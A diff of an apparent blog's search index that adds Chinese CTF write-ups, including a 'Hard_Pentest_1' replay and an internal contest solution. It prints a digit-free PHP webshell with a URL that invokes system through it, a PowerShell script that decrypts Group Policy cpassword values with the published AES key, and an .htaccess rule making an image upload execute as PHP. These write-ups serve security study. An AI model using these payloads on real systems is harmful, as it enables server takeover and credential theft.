+<ul>
+<li>直接查看定时任务也可以看到该进程被启用的信息</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190924/15693239569853.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190924/1569323988668.png" alt="img"></p>
+<ul>
+<li>可以知挖矿病毒绝对路径<code>/etc/xmr-stak-cpu/bin/xmr-stak-cpu</code>,同时<code>bin/config.txt</code>存储了挖矿病毒的配置信息，可以直接得知挖矿病毒的钱包地址。</li>
+</ul>
 ]]></content>
       <categories>
         <category>CTF比赛</category>
@@ -5237,6 +5381,92 @@ enctype=&quot;multipart/form-data&quot;&gt;
 <p><img src="http://goodcheerleung.gitee.io/mycute/20200421/15874023458299.png" alt="img"></p>
 <p>直接修改<code>PHPSESSID=432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4</code> 直接出来flag</p>
 <p><img src="http://goodcheerleung.gitee.io/mycute/20200421/15874024375148.png" alt="img"></p>
+]]></content>
+      <categories>
+        <category>CTF比赛</category>
+      </categories>
+      <tags>
+        <tag>WriteUp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hard_Pentest_1 复现</title>
+    <url>//articles/d5850ed2ae.html</url>
+    <content><![CDATA[<h2 id="无数字字母的webshell"><a href="#无数字字母的webshell" class="headerlink" title="无数字字母的webshell"></a>无数字字母的webshell</h2><p>上传绕过，只需用短标签、P神的无数字字母的webshell绕过即可，上传文件名绕过因为是windows直接大小写绕过。</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="php">&lt;?= $_=[] ?&gt; 
+&lt;?= $_=@&quot;$_&quot; ?&gt;
+&lt;?= $_=$_[(&#39;!&#39;==&#39;@&#39;)] ?&gt;
+
+&lt;?= $__ = $_ ?&gt;
+&lt;?= @$____ = $__++ + $__++ + $__++ + $__++ + $__++ + $__++ ?&gt;
+&lt;?= $_______ = &quot;_&quot;.$__ ?&gt;
+
+&lt;?= $__ = $_ ?&gt;
+&lt;?= @$____ = $__++ + $__++ + $__++ + $__++ ?&gt;
+&lt;?= $_______ .= $__ ?&gt;
+
+&lt;?= $__ = $_ ?&gt;
+&lt;?= @$____ = $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++  ?&gt;
+&lt;?= $_______ .= $__  ?&gt;
+
+&lt;?= ${$_______}[&quot;_&quot;](${$_______}[&quot;__&quot;]) ?&gt;</code></pre>
+<h3 id="写小马："><a href="#写小马：" class="headerlink" title="写小马："></a>写小马：</h3><pre><code class="http">http://47.113.219.76/uploads/d8ffd2952b7416f6096c2481dfad4351/6539886cfe4730b929fa714a800aa44a_6.Php?_=system&amp;__=echo &quot;&lt;?php phpinfo()?&gt;&quot;&gt;&gt;1.php</code></pre>
+<h2 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h2><p>上传cmd.exe后执行net user看到提示在<code>\\192.168.0.12\Hint</code></p>
+<p><img src="http://goodcheerleung.gitee.io/blog/20200507032004.png" alt="20200507032004"></p>
+<p>看到一个压缩包里面有flag1和flag2的提示。</p>
+<p><img src="http://goodcheerleung.gitee.io/blog/20200507032131.png" alt="20200507032131"></p>
+<h3 id="SYSVOL还原组策略中保存的密码"><a href="#SYSVOL还原组策略中保存的密码" class="headerlink" title="SYSVOL还原组策略中保存的密码"></a>SYSVOL还原组策略中保存的密码</h3><p>参考3gstudent的-<a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8SYSVOL%E8%BF%98%E5%8E%9F%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/" target="_blank" rel="noopener">域渗透——利用SYSVOL还原组策略中保存的密码</a>。</p>
+<p>在域中，存在一个默认的共享路径：</p>
+<pre><code>\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\</code></pre><p>这里的域可以在ipconfig /all下看到：</p>
+<p><img src="http://goodcheerleung.gitee.io/blog/20200507022504.png" alt="20200507022504"></p>
+<p>直接访问如下地址</p>
+<pre><code>//De1CTF2020.lab/SYSVOL/De1CTF2020.lab/</code></pre><p><img src="http://goodcheerleung.gitee.io/blog/20200507022747.png" alt="20200507022747"></p>
+<p>找到对应的策略组id配置文件，如下的Group.xml</p>
+<pre><code>//De1CTF2020.lab/SYSVOL/De1CTF2020.lab/Policies/{B1248E1E-B97D-4C41-8EA4-1F2600F9264B}/Machine/Preferences/Groups/</code></pre><p><img src="http://goodcheerleung.gitee.io/blog/20200507023026.png" alt="20200507023026"></p>
+<p>简单的来说就是：<code>\SYSVOL</code>路径中保存了域内用户的一些配置信息-&gt;找到<code>HintZip_Pass</code>用户的配置信息-&gt;然后找到AES256加密的密钥，由于微软已经公开了私钥，那么就可以把这个登录密钥还原出来-&gt;最后解出压缩包。下面的cpasswd就是加密的秘钥</p>
+<p><img src="http://goodcheerleung.gitee.io/blog/20200507032239.png" alt="20200507032239"></p>
+<h3 id="解密脚本"><a href="#解密脚本" class="headerlink" title="解密脚本"></a>解密脚本</h3><pre><code class="powershell">function Get-DecryptedCpassword {
+    [CmdletBinding()]
+    Param (
+        [string] $Cpassword 
+    )
+
+    try {
+        #Append appropriate padding based on string length  
+        $Mod = ($Cpassword.length % 4)
+
+        switch ($Mod) {
+        &#39;1&#39; {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
+        &#39;2&#39; {$Cpassword += (&#39;=&#39; * (4 - $Mod))}
+        &#39;3&#39; {$Cpassword += (&#39;=&#39; * (4 - $Mod))}
+        }
+
+
+        $Base64Decoded = [Convert]::FromBase64String($Cpassword)
+
+        #Create a new AES .NET Crypto Object
+        $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
+        [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
+                             0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
+
+        #Set IV to all nulls to prevent dynamic generation of IV value
+        $AesIV = New-Object Byte[]($AesObject.IV.Length) 
+        $AesObject.IV = $AesIV
+        $AesObject.Key = $AesKey
+        $DecryptorObject = $AesObject.CreateDecryptor() 
+        [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
+
+        return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
+    } 
+
+    catch {Write-Error $Error[0]}
+}  
+Get-DecryptedCpassword &quot;uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+08&quot;</code></pre>
+<p>执行：</p>
+<pre><code>powershell -executionpolicy bypass -file 1.ps1</code></pre><p><img src="http://goodcheerleung.gitee.io/blog/20200507032803.png" alt="20200507032803"></p>
+<p>压缩包的密码是：<code>zL1PpP@sSwO3d</code></p>
+<p>得到flag:</p>
+<p><img src="http://goodcheerleung.gitee.io/blog/20200507032939.png" alt="20200507032939"></p>
 ]]></content>
       <categories>
         <category>CTF比赛</category>
@@ -7746,53 +7976,6 @@ if(!isset($_GET[&#39;num&#39;])){
       </tags>
   </entry>
   <entry>
-    <title>内部交流小比赛</title>
-    <url>//articles/d7163af6f6.html</url>
-    <content><![CDATA[<h1 id="top-3-mountains-WP"><a href="#top-3-mountains-WP" class="headerlink" title="top 3 mountains WP"></a>top 3 mountains WP</h1><h2 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h2><ul>
-<li><p>首先给出界面输入one时候会显示一张图片，可以猜测是文件包含或者ssrf?</p>
-</li>
-<li><p>一开始猜测是：</p>
-</li>
-</ul>
-<pre><code class="php">  inlude(&quot;tour/&quot;$num.&quot;.php&quot;）            </code></pre>
-<ul>
-<li>但是这样这道题没意义了，所以必定是ssrf，输入/etc/passwd有回显。直接上fuzz看看。</li>
-</ul>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20200402/15857612653555.png" alt="img"></p>
-<ul>
-<li>直接跑出日志文件。看看出题人之前的操作。找出关键文件。</li>
-</ul>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20200402/15857613447154.png" alt="img"></p>
-<ul>
-<li>直接有源码，无参数RCE，过滤了dir所以以前构造基本没戏，直接用SESSIONID去构造参数。</li>
-</ul>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20200402/15857613861725.png" alt="img"></p>
-<ul>
-<li>getflag</li>
-</ul>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20200402/1585761521936.png" alt="img"></p>
-<h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><p>读取index.php源码</p>
-<pre><code>hhhm://redmango.top/../../index.php</code></pre><h1 id="Upload-WP"><a href="#Upload-WP" class="headerlink" title="Upload WP"></a>Upload WP</h1><p>扫描器一把梭出来<code>upload.html</code></p>
-<p>随便上传个文件，黑名单，直接hatccess。</p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20200402/15857972207333.png" alt="img"></p>
-<ul>
-<li>直接hatccess</li>
-</ul>
-<pre><code>&lt;FilesMatch &quot;shell.jpg&quot;&gt;
-    SetHandler application/x-httpd-php
-  &lt;/FilesMatch&gt;</code></pre><p><strong><img src="http://goodcheerleung.gitee.io/mycute/20200402/15857974174812.png" alt="img"></strong></p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20200402/15857987303976.png" alt="img"></p>
-<p>换位密码：</p>
-<p>flag{htACceSs_fI1E_29uP1oAd666}</p>
-]]></content>
-      <categories>
-        <category>CTF比赛</category>
-      </categories>
-      <tags>
-        <tag>WriteUp</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>复现CISCN2019 华北赛区 Day1 Web5]CyberPunk</title>
     <url>//articles/d711660d49.html</url>
     <content><![CDATA[<ul>
@@ -8317,6 +8500,53 @@ $db = new mysqli($DATABASE[&#39;host&#39;],$DATABASE[&#39;username&#39;],$DATABA
 </ul>
 </li>
 </ul>
+]]></content>
+      <categories>
+        <category>CTF比赛</category>
+      </categories>
+      <tags>
+        <tag>WriteUp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>内部交流小比赛</title>
+    <url>//articles/d7163af6f6.html</url>
+    <content><![CDATA[<h1 id="top-3-mountains-WP"><a href="#top-3-mountains-WP" class="headerlink" title="top 3 mountains WP"></a>top 3 mountains WP</h1><h2 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h2><ul>
+<li><p>首先给出界面输入one时候会显示一张图片，可以猜测是文件包含或者ssrf?</p>
+</li>
+<li><p>一开始猜测是：</p>
+</li>
+</ul>
+<pre><code class="php">  inlude(&quot;tour/&quot;$num.&quot;.php&quot;）            </code></pre>
+<ul>
+<li>但是这样这道题没意义了，所以必定是ssrf，输入/etc/passwd有回显。直接上fuzz看看。</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20200402/15857612653555.png" alt="img"></p>
+<ul>
+<li>直接跑出日志文件。看看出题人之前的操作。找出关键文件。</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20200402/15857613447154.png" alt="img"></p>
+<ul>
+<li>直接有源码，无参数RCE，过滤了dir所以以前构造基本没戏，直接用SESSIONID去构造参数。</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20200402/15857613861725.png" alt="img"></p>
+<ul>
+<li>getflag</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20200402/1585761521936.png" alt="img"></p>
+<h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><p>读取index.php源码</p>
+<pre><code>hhhm://redmango.top/../../index.php</code></pre><h1 id="Upload-WP"><a href="#Upload-WP" class="headerlink" title="Upload WP"></a>Upload WP</h1><p>扫描器一把梭出来<code>upload.html</code></p>
+<p>随便上传个文件，黑名单，直接hatccess。</p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20200402/15857972207333.png" alt="img"></p>
+<ul>
+<li>直接hatccess</li>
+</ul>
+<pre><code>&lt;FilesMatch &quot;shell.jpg&quot;&gt;
+    SetHandler application/x-httpd-php
+  &lt;/FilesMatch&gt;</code></pre><p><strong><img src="http://goodcheerleung.gitee.io/mycute/20200402/15857974174812.png" alt="img"></strong></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20200402/15857987303976.png" alt="img"></p>
+<p>换位密码：</p>
+<p>flag{htACceSs_fI1E_29uP1oAd666}</p>
 ]]></content>
       <categories>
         <category>CTF比赛</category>
